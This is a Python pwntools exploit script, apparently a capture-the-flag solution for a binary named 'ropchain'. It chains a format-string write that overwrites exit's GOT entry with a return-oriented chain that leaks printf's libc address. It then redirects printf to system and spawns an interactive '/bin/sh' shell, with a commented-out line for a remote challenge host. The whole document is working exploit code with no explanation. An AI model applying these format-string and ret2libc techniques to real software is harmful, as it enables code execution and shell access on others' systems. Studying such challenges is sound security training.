from pwn import *

e = context.binary = ELF("./ropchain")
r = e.process()
# r = remote("10.81.0.7", 14002)
# l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
l = e.libc

exit_got = 0x404030
arbitrary_gadget = 0x00000000004012ac
pop_rdi = 0x00000000004012b3
pop_rsi_r15 = 0x00000000004012b1
scanf = 0x0000000000401090
pl = f'%{arbitrary_gadget}c%8$n'.encode()
pl = pl.ljust(16, b'A')
pl += p64(exit_got)
pl += p64(pop_rdi + 1)
pl += p64(pop_rdi)
pl += p64(e.got['printf'])
pl += p64(e.plt.printf)
pl += p64(pop_rdi)
pl += p64(0x403004) # %499s
pl += p64(pop_rsi_r15)
pl += p64(e.got['printf']) + p64(0)
pl += p64(scanf)
pl += p64(pop_rdi)
pl += p64(e.got.exit)
pl += p64(pop_rdi+1)
pl += p64(e.plt.printf)
pause()
r.sendline(pl)
r.recvuntil(p64(exit_got)[:3])
l.address = u64(r.recv(6) + b'\0\0') - l.sym['printf']
print(hex(l.address))

pl = p64(l.sym['system'])
pl += b'A' * 16
pl += b'/bin/sh\0'

pause()
r.sendline(pl)
r.interactive()

